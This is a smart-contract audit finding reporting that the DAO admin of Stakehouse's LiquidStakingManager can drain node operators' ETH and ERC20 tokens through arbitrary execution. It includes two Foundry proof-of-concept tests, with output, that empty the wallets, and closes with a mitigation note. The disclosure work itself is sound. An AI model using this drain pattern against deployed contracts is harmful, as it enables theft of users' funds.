## Tags

- bug
- 2 (Med Risk)
- primary issue
- satisfactory
- selected for report
- sponsor confirmed
- M-08

# [Dao admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund in the smart wallet via arbitrary execution.](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/106) 

# Lines of code

https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L202
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L210
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L426
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L460
https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/smart-wallet/OwnableSmartWallet.sol#L63


# Vulnerability details

## Impact

Dao admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund via arbitrary execution.

## Proof of Concept

After the Liquid Staking Manager.so is deployed via LSDNFactory::deployNewLiquidStakingDerivativeNetwork,

```solidity
/// @notice Deploys a new LSDN and the liquid staking manger required to manage the network
/// @param _dao Address of the entity that will govern the liquid staking network
/// @param _stakehouseTicker Liquid staking derivative network ticker (between 3-5 chars)
function deployNewLiquidStakingDerivativeNetwork(
	address _dao,
	uint256 _optionalCommission,
	bool _deployOptionalHouseGatekeeper,
	string calldata _stakehouseTicker
) public returns (address) {
```

The dao address governance address (contract) has very high privilege.

The dao address can perform arbitrary execution by calling LiquidStakingManager.sol::executeAsSmartWallet

```solidity
/// @notice Enable operations proxied through DAO contract to another contract
/// @param _nodeRunner Address of the node runner that created the wallet
/// @param _to Address of the target contract
/// @param _data Encoded data of the function call
/// @param _value Total value attached to the transaction
function executeAsSmartWallet(
	address _nodeRunner,
	address _to,
	bytes calldata _data,
	uint256 _value
) external payable onlyDAO {
	address smartWallet = smartWalletOfNodeRunner[_nodeRunner];
	require(smartWallet != address(0), "No wallet found");
	IOwnableSmartWallet(smartWallet).execute(
		_to,
		_data,
		_value
	);
}
```

When a register a new node operator with 4 ETH by calling registerBLSPublicKeys:

```solidity
/// @notice register a node runner to LSD by creating a new smart wallet
/// @param _blsPublicKeys list of BLS public keys
/// @param _blsSignatures list of BLS signatures
/// @param _eoaRepresentative EOA representative of wallet
function registerBLSPublicKeys(
	bytes[] calldata _blsPublicKeys,
	bytes[] calldata _blsSignatures,
	address _eoaRepresentative
) external payable nonReentrant {
```

the smart wallet created in the smart contract custody the 4 ETH.

```solidity
// create new wallet owned by liquid staking manager
smartWallet = smartWalletFactory.createWallet(address(this));
emit SmartWalletCreated(smartWallet, msg.sender);
```

```solidity
{
	// transfer ETH to smart wallet
	(bool result,) = smartWallet.call{value: msg.value}("");
	require(result, "Transfer failed");
	emit WalletCredited(smartWallet, msg.value);
}
```

but  Dao admin in LiquidStakingManager.sol can rug the registered node operator by stealing their fund in the smart wallet via arbitrary execution.

**As shown in POC:**

first we add this smart contract in LiquidStakingManager.t.sol

https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12

```solidity
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract RugContract {

    function receiveFund() external payable {

    }

    receive() external payable {}
}

contract MockToken is ERC20 {

    constructor()ERC20("A", "B") {
        _mint(msg.sender, 10000 ether);
    }

}
```

**We add the two POC,** 

https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L35

the first POC shows the admin can steal the ETH from the smart contract via arbrary execution.

```solidity
    function testDaoRugFund_Pull_ETH_POC() public {
        
        address user = vm.addr(21312);

        bytes[] memory publicKeys = new bytes[](1);
        publicKeys[0] = "publicKeys";

        bytes[] memory signature = new bytes[](1);
        signature[0] = "signature";

        RugContract rug = new RugContract();

        // user spends 4 ehter and register the key to become the public operator
        vm.prank(user);
        vm.deal(user, 4 ether);
        manager.registerBLSPublicKeys{value: 4 ether}(
            publicKeys,
            signature,
            user
        );
        address wallet = manager.smartWalletOfNodeRunner(user);
        console.log("wallet ETH balance for user after registering");
        console.log(wallet.balance);

        // dao admin rug the user by withdraw the ETH via arbitrary execution.
        vm.prank(admin);
        bytes memory data = abi.encodeWithSelector(RugContract.receiveFund.selector, "");
        manager.executeAsSmartWallet(
            user,
            address(rug),
            data,
            4 ether
        );
        console.log("wallet ETH balance for user after DAO admin rugging");
        console.log(wallet.balance);

    }
```

We run the test:

```solidity
forge test -vv --match testDaoRugFund_Pull_ETH_POC
```

the result is

```solidity
Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests
[PASS] testDaoRugFund_Pull_ETH_POC() (gas: 353826)
Logs:
  wallet ETH balance for user after registering
  4000000000000000000
  wallet ETH balance for user after DAO admin rugging
  0

Test result: ok. 1 passed; 0 failed; finished in 13.63ms
```

the second POC shows the admin can steal the ERC20 token from the smart contract via arbrary execution.

```solidity
    function testDaoRugFund_Pull_ERC20_Token_POC() public {

        address user = vm.addr(21312);

        bytes[] memory publicKeys = new bytes[](1);
        publicKeys[0] = "publicKeys";

        bytes[] memory signature = new bytes[](1);
        signature[0] = "signature";

        RugContract rug = new RugContract();

        vm.prank(user);
        vm.deal(user, 4 ether);
        manager.registerBLSPublicKeys{value: 4 ether}(
            publicKeys,
            signature,
            user
        );

        address wallet = manager.smartWalletOfNodeRunner(user);
        ERC20 token = new MockToken();
        token.transfer(wallet, 100 ether);

        console.log("wallet ERC20 token balance for user after registering");
        console.log(token.balanceOf(wallet));

        vm.prank(admin);
        bytes memory data = abi.encodeWithSelector(IERC20.transfer.selector, address(rug), 100 ether);
        manager.executeAsSmartWallet(
            user,
            address(token),
            data,
            0
        );

        console.log("wallet ERC20 token balance for dao rugging");
        console.log(token.balanceOf(wallet));

    }
```

We run the test:

```solidity
forge test -vv --match testDaoRugFund_Pull_ERC20_Token_POC
```

the running result is

```solidity
Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests
[PASS] testDaoRugFund_Pull_ERC20_Token_POC() (gas: 940775)
Logs:
  wallet ERC20 token balance for user after registering
  100000000000000000000
  wallet ERC20 token balance for dao rugging
  0

Test result: ok. 1 passed; 0 failed; finished in 16.99ms
```


## Tools Used

Manual Review, Foundry

## Recommended Mitigation Steps

We recommend not give the dao admin the priviledge to perform arbitrary execution to access user's fund.